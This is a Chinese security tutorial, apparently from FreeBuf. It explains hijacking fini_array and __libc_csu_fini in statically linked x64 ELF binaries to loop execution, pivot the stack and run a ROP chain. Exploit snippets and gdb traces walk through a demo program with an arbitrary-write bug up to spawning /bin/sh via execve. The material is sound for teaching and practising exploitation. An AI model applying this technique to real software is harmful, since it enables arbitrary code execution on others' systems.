@@ -1,0 +1,484 @@
+**用gdb调试main函数的时候，不难发现main的返回地址是__libc_start_main也就是说main并不是程序真正开始的地方，__libc_start_main是main的爸爸。**
+
+然鹅，__libc_start_main也有爸爸，他就是_start也就是Entry point程序的进入点啦，可以通过readelf -h查看：
+
+    
+    
+    ELF Header:
+      Magic:   7f 45 4c 46 02 01 01 03 00 00 00 00 00 00 00 00 
+      Class:                             ELF64
+      Data:                              2's complement, little endian
+      Version:                           1 (current)
+      OS/ABI:                            UNIX - GNU
+      ABI Version:                       0
+      Type:                              EXEC (Executable file)
+      Machine:                           Advanced Micro Devices X86-64
+      Version:                           0x1
+      Entry point address:               0x401a60
+      Start of program headers:          64 (bytes into file)
+      Start of section headers:          835672 (bytes into file)
+      Flags:                             0x0
+      Size of this header:               64 (bytes)
+      Size of program headers:           56 (bytes)
+      Number of program headers:         8
+      Size of section headers:           64 (bytes)
+      Number of section headers:         31
+      Section header string table index: 30
+    
+
+（这是一个64位静态编译的ELF程序）其中，Entry point address: 0x401a60就是_start的地址：
+
+    
+    
+    .text:0000000000401A60                 public start
+    .text:0000000000401A60 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o
+    .text:0000000000401A60 ; __unwind {
+    .text:0000000000401A60                 xor     ebp, ebp
+    .text:0000000000401A62                 mov     r9, rdx
+    .text:0000000000401A65                 pop     rsi
+    .text:0000000000401A66                 mov     rdx, rsp
+    .text:0000000000401A69                 and     rsp, 0FFFFFFFFFFFFFFF0h
+    .text:0000000000401A6D                 push    rax
+    .text:0000000000401A6E                 push    rsp
+    .text:0000000000401A6F                 mov     r8, offset sub_402BD0 ; fini
+    .text:0000000000401A76                 mov     rcx, offset loc_402B40 ; init
+    .text:0000000000401A7D                 mov     rdi, offset main
+    .text:0000000000401A84                 db      67h
+    .text:0000000000401A84                 call    __libc_start_main
+    .text:0000000000401A8A                 hlt
+    .text:0000000000401A8A ; } // starts at 401A60
+    .text:0000000000401A8A start           endp
+    
+
+x64是通过寄存器来保存函数参数的：
+
+    
+    
+          rdi - first argument
+          rsi - second argument
+          rdx - third argument
+          rcx - fourth argument
+          r8  - fifth argument
+          r9  - sixth argument
+
+可以发现__libc_start_main函数的参数中，有3个是函数指针：
+
+    
+    
+    rdi <- main 
+    
+    rcx <- __libc_csu_init
+    
+    r8 <- __libc_csu_fini
+
+不难想到，除main以外的这两位兄弟，一位在main开始执行前执行，一位在main执行完毕后执行
+
+__libc_csu_fini就是在main执行完毕后执行的那位
+
+这兄弟虽然只有短短几行指令，但是能利用的点却贼多，他长这样：
+
+    
+    
+    pwndbg> x/20i 0x402bd0
+      0x402bd0 <__libc_csu_fini>:    push   rbp
+      0x402bd1 <__libc_csu_fini+1>:    lea    rax,[rip+0xb24e8]        # 0x4***c0 
+      0x402bd8 <__libc_csu_fini+8>:    lea    rbp,[rip+0xb24d1]        # 0x4***b0 
+      0x402bdf <__libc_csu_fini+15>:    push   rbx
+      0x402be0 <__libc_csu_fini+16>:    sub    rax,rbp
+      0x402be3 <__libc_csu_fini+19>:    sub    rsp,0x8
+      0x402be7 <__libc_csu_fini+23>:    sar    rax,0x3
+      0x402beb <__libc_csu_fini+27>:    je     0x402c06 <__libc_csu_fini+54>
+      0x402bed <__libc_csu_fini+29>:    lea    rbx,[rax-0x1]
+      0x402bf1 <__libc_csu_fini+33>:    nop    DWORD PTR [rax+0x0]
+      0x402bf8 <__libc_csu_fini+40>:    call   QWORD PTR [rbp+rbx*8+0x0]
+      0x402bfc <__libc_csu_fini+44>:    sub    rbx,0x1
+      0x402c00 <__libc_csu_fini+48>:    cmp    rbx,0xffffffffffffffff
+      0x402c04 <__libc_csu_fini+52>:    jne    0x402bf8 <__libc_csu_fini+40>
+      0x402c06 <__libc_csu_fini+54>:    add    rsp,0x8
+      0x402c0a <__libc_csu_fini+58>:    pop    rbx
+      0x402c0b <__libc_csu_fini+59>:    pop    rbp
+      0x402c0c <__libc_csu_fini+60>:    jmp    0x48f52c <_fini>
+    
+
+下面先概括的说下这个函数可利用的点，在后面会详细分析：
+
+首先，看下面这条指令：
+
+    
+    
+    0x402bd8: lea rbp,[rip+0xb24d1] # 0x4***b0
+
+rbp = 0x4***b0，0x4***b0是fini_array的首地址
+
+这条指令相当于lea rbp,[fini_array]
+
+因此，在这里配合gadget:
+
+    
+    
+    leave ; (mov rsp,ebp; pop rbp)
+    ret
+    
+
+可以把栈迁移到fini_array（fini_array存储的函数指针，自然有写权限）
+
+其次，下面有一条call指令：
+
+    
+    
+    0x402bf8: call QWORD PTR [rbp+rbx*8]
+
+> rbp即为fini_array，因此这里将调用fini_array中的函数
+>
+> 只要修改fini_array中的值，就可以实现控制流的转移啦（传说中的fini_array劫持）
+
+由此可见静态编译程序的__libc_csu_fini简直好用的不得了鸭，既可以完成栈迁移，又能够劫持控制流
+
+> p.s. 动态链接的程序__libc_csu_fini很短，并没有上述指令..
+
+fini_array的地址可通过查看静态编译程序的section信息获得：
+
+    
+    
+    pwndbg> elfheader 
+    0x400200 - 0x400224  .note.gnu.build-id
+    0x400224 - 0x400244  .note.ABI-tag
+    0x400248 - 0x400470  .rela.plt
+    0x401000 - 0x401017  .init
+    0x401018 - 0x4010d0  .plt
+    0x4010d0 - 0x48d630  .text
+    0x48d630 - 0x48f52b  __libc_freeres_fn
+    0x48f52c - 0x48f535  .fini
+    0x490000 - 0x4a95dc  .rodata
+    0x4a95dc - 0x4a95dd  .stapsdt.base
+    0x4a95e0 - 0x4b3d00  .eh_frame
+    0x4b3d00 - 0x4b3da9  .gcc_except_table
+    0x4***80 - 0x4***a0  .tdata
+    0x4***a0 - 0x4***b0  .init_array
+    0x4***a0 - 0x4***e0  .tbss
+    0x4***b0 - 0x4***c0  .fini_array
+    0x4***c0 - 0x4b7ef4  .data.rel.ro
+    0x4b7ef8 - 0x4b7fe8  .got
+    0x4b8000 - 0x4b80d0  .got.plt
+    0x4b80e0 - 0x4b9bf0  .data
+    0x4b9bf0 - 0x4b9c38  __libc_subfreeres
+    0x4b9c40 - 0x4ba2e8  __libc_IO_vtables
+    0x4ba2e8 - 0x4ba2f0  __libc_atexit
+    0x4ba300 - 0x4bba78  .bss
+    0x4bba78 - 0x4bbaa0  __libc_freeres_ptrs
+    
+
+其中0x4***b0 - 0x4***c0即.fini_array数组，其中存在两个函数指针：
+
+    
+    
+    pwndbg> x/2xg 0x4***b0
+    0x4***b0:    0x0000000000401b10    0x0000000000401580
+    pwndbg> x/i 0x0000000000401b10
+       0x401b10 <__do_global_dtors_aux>:    cmp    BYTE PTR [rip+0xb87e9],0x0
+    pwndbg> x/i 0x0000000000401580
+       0x401580 <fini>:    mov    rax,QWORD PTR [rip+0xb9b71]
+    
+
+> array[0]:__do_global_dtors_aux
+>
+> array[1]:fini
+
+这两个函数都会在main执行完毕后执行，因此可以覆盖这两个函数指针，即可实现控制流的劫持
+
+> 此外，静态链接的程序也有PLT表和GOT表，也可以覆盖通过GOT中的函数指针实现控制流劫持
+
+上述fini_array中的两个函数指针在__libc_csu_fini（上文说的那位兄弟）中被执行
+
+执行的顺序是array[1]->array[0]
+
+于是，有了一种比较好玩儿的操作：
+
+把array[0]的值覆盖为那位兄弟（__libc_csu_fini函数）的地址
+
+把array[1]的值覆盖为另一个函数地址，就叫他addrA吧
+
+于是，main执行完毕后执行__libc_csu_fini，于是有意思的来了！
+
+__libc_csu_fini先执行一遍array[1]:addrA，返回后再执行array[0]:__libc_csu_fini
+
+__libc_csu_fini先执行一遍array[1]:addrA，返回后再执行array[0]:__libc_csu_fini
+
+__libc_csu_fini先执行一遍array[1]:addrA，返回后再执行array[0]:__libc_csu_fini
+
+......
+
+看！连起来啦~ main->__libc_csu_fini->addrA->__libc_csu_fini->addrA-> ......
+
+因吹斯汀~
+
+详细的过程如下：
+
+    
+    
+       0x402bd1 <__libc_csu_fini+1>:    lea    rax,[rip+0xb24e8]        # 0x4***c0 
+       0x402bd8 <__libc_csu_fini+8>:    lea    rbp,[rip+0xb24d1]        # 0x4***b0 
+       0x402bdf <__libc_csu_fini+15>:    push   rbx
+       0x402be0 <__libc_csu_fini+16>:    sub    rax,rbp
+       0x402be3 <__libc_csu_fini+19>:    sub    rsp,0x8
+       0x402be7 <__libc_csu_fini+23>:    sar    rax,0x3
+    
+
+rax = 0x4***c0 - 0x4***b0 = 0x10
+
+rax = 0x10 >> 3 = 2
+
+    
+    
+       0x402bed <__libc_csu_fini+29>:    lea    rbx,[rax-0x1]
+       0x402bf1 <__libc_csu_fini+33>:    nop    DWORD PTR [rax+0x0]
+       0x402bf8 <__libc_csu_fini+40>:    call   QWORD PTR [rbp+rbx*8+0x0]
+    
+
+rbx = rax-1 = 1
+
+call [rbp+rbx*8+0x0]即call array[1]即call addrA
+
+    
+    
+       0x402bfc <__libc_csu_fini+44>:    sub    rbx,0x1
+       0x402c00 <__libc_csu_fini+48>:    cmp    rbx,0xffffffffffffffff
+       0x402c04 <__libc_csu_fini+52>:    jne    0x402bf8 <__libc_csu_fini+40>
+    
+
+addrA执行完毕后返回到0x402bfc
+
+rbx = rbp - 1 = 0
+
+rbx != -1，于是程序控制流又回到了那位兄弟手中：
+
+    
+    
+    0x402bf8 <__libc_csu_fini+40>:    call   QWORD PTR [rbp+rbx*8+0x0]
+    
+
+此时执行的是call array[1]即call __libc_csu_fini（call自己个儿啊）
+
+于是循环往复，只要array[0]中的__libc_csu_fini值不变，程序就会一直循环执行addrA
+
+当然，将array[1]中的addrA改成其他的addrB、addrC也都会执行
+
+想要终止循环，只需把array[0]中的__libc_csu_fini换掉即可
+
+就这样，那位兄弟只要占住了array[0]这个坑，就可以让addrA无限次的执行下去啦
+
+### 小结一下：
+
+x64静态编译程序，劫持fini_array
+
+> array[0]覆盖为__libc_csu_fini
+>
+> array[1]覆盖为另一地址addrA
+
+程序将循环执行addrA
+
+终止条件为array[0]不再为__libc_csu_fini
+
+相当于：
+
+    
+    
+    while (array[0] == __libc_csu_fini){
+        addrA();
+    }
+    
+
+比如addrA中存在任意写一字节内存漏洞，通过上面这个循环就可以实现任意写多字节
+
+至于ROP攻击，可以通过上述的栈迁移来实现
+
+leave; ret相当于执行如下操作：
+
+> mov rsp, rbp (fini_array->rsp)
+>
+> pop rbp (fini_array->rbp)
+>
+> ret (fini_array+0x8->ret )
+
+这里有两种栈迁移方法： 第一种：在array[1]处迁移栈（需迁移两次
+
+> fini_array+0x0:(data)fini_array+0x8
+>
+> fini_array+0x8:(gadget)leave_ret
+>
+> fini_array+0x10:rop chain
+
+第二种：跳过array[1]，在array[0]处迁移栈
+
+> fini_array+0x0:(gadget)leave_ret
+>
+> fini_array+0x8:(gadget)ret
+>
+> fini_array+0x10:rop chain
+
+这两种方法都可以达到栈迁移的目的，直接说比较难理解，待会实际调试一下就明白啦（下面有例子）
+总之，向fini_array+0x10,fini_array+0x18...中依次布置gadget 构造好了ROP链，就可以完成ROP攻击啦~
+
+举个栗子
+
+    
+    
+    #include <stdio.h>
+    #include <stdlib.h>
+    
+    int main(int argc, char *argv[]){
+        char buf[30];
+        write(1,"addr:",5);
+        read(0,&buf,200);
+        int *addr = buf;
+        write(1,"data:",5);
+        read(0,*addr,24);
+        return 0;
+    }
+    
+    
+    
+    $ gcc demo.c -no-pie --static -o demo
+    
+
+很明显，存在任意写内存的漏洞，可以改写任意内存位置的连续24个字节。利用方式如下：
+
+    
+    
+      ru('addr:')
+      sl(p64(addr))
+      ru('data:')
+      se(p64(data1)+p64(data2)+p64(data3))
+    
+
+24字节显然不够，于是可以用上文提到的循环大法：
+
+> array[0]:__libc_csu_fini
+>
+> array[1]:main
+
+让main函数多执行几次，这样就可以控制足够大的内存空间，往里面布置ROP链啦~
+
+就这个栗子而言，ROP攻击的思路大概是这样：
+
+利用任意写，劫持fini_array
+
+循环执行main，利用任意写，将ROP链布置到fini_array+0x10
+
+终止循环，并将栈迁移到fini_array+0x10执行ROP链
+
+劫持fini_array+循环大法：
+
+    
+    
+      ru('addr:')
+      sl(p64(fini_array))
+      ru('data:')
+      se(p64(libc_csu_fini)+p64(main))
+    
+
+布置ROP链：执行SYS_execve('/bin/sh',0,0)，需要完成以下寄存器的布局：
+
+    
+    
+      RAX  0x3b
+      RDI  addr -> '/bin/sh'
+      RDX  0
+      RSI  0
+    
+
+对应的ROP链如下：
+
+    
+    
+      pop_rdi=0x00000000004016a6     # pop rdi ; ret
+      pop_rax=0x0000000000447bbc     # pop rax ; ret
+      pop_rdx_rsi=0x000000000044a659 # pop rdx ; pop rsi ; ret
+      syscall = 0x0000000000402434   # syscall
+      bin_sh_addr=fini_array+0x50    # ropchain start at fini_array+0x10
+    
+      ropchain = [p64(pop_rdi),p64(bin_sh_addr),
+                  p64(pop_rax),p64(0x3b),
+                  p64(pop_rdx_rsi),p64(0),p64(0),
+                  p64(syscall),
+                  "/bin/sh\x00"]
+    
+      # write ropchain to fini_array
+      for i in range(len(ropchain)):
+          ru('addr:')
+          sl(p64(fini_array+0x10+i*8))
+          ru('data:')
+          se(ropchain[i])
+
+现在布置完了ROP链，可以跳出循环了，跳出循环后，通过leave_ret完成栈迁移，执行ROP链：
+
+    
+    
+      ru('addr:')
+      sl(p64(fini_array))
+      ru('data:')
+      se(p64(leave)+p64(ret)) # break loop and stack pivot
+    
+
+这里用的是上文中的第二种栈迁移方式：
+
+> fini_array+0x0:(gadget)leave_ret
+>
+> fini_array+0x8:(gadget)ret
+>
+> fini_array+0x10:rop chain
+
+这是因为循环大法中的array[1]是main，main返回后将执行array[0]处的函数：
+
+leave执行前：
+
+    
+    
+       ► 0x401c29 <main+172>              leave  
+         0x401c2a <main+173>              ret    
+          ↓
+         0x401016 <_init+22>              ret    
+          ↓
+         0x4016a6 <init_cacheinfo+230>    pop    rdi
+         0x4016a7 <init_cacheinfo+231>    ret    
+          ↓
+         0x447bbc <__open_nocancel+92>    pop    rax
+    
+      pwndbg> x/10xg $rsp
+      0x7fff85f385c8:    0x0000000000402bfc    0x00000000004***f8
+      0x7fff85f385d8:    0x0000000000000000    0x00000000004***b0
+      0x7fff85f385e8:    0x0000000000402bfc    0x00000000004***f0
+      0x7fff85f385f8:    0x0000000000000000    0x00000000004***b0
+      0x7fff85f38608:    0x0000000000402bfc    0x00000000004***e8
+    
+
+leave执行后：
+
+栈被迁移到fini_array+0x8，即array[1]，但是这里并不是ROP链的开始
+
+在array[1]这里用只含ret一个指令的gadget，让控制流后移，进入到fini_array+0x10的ROP链中
+
+    
+    
+     0x401c29 <main+172>              leave  
+    ► 0x401c2a <main+173>              ret             <0x401016; _init+22>
+      ↓
+     0x401016 <_init+22>              ret    
+      ↓
+     0x4016a6 <init_cacheinfo+230>    pop    rdi
+     0x4016a7 <init_cacheinfo+231>    ret    
+      ↓
+     0x447bbc <__open_nocancel+92>    pop    rax
+    
+    pwndbg> x/10xg $rsp
+    0x4***b8:    0x0000000000401016    0x00000000004016a6
+    0x4***c8:    0x00000000004b5100    0x0000000000447bbc
+    0x4***d8:    0x000000000000003b    0x000000000044a659
+    0x4***e8:    0x0000000000000000    0x0000000000000000
+    0x4***f8:    0x0000000000402434    0x0068732f6e69622f
+    
+
+ROP链执行完毕后就会执行SYS_execve('/bin/sh',0,0)啦~
+
+ ***本文原创作者：taqini，本文属FreeBuf原创奖励计划，未经许可禁止转载**
+
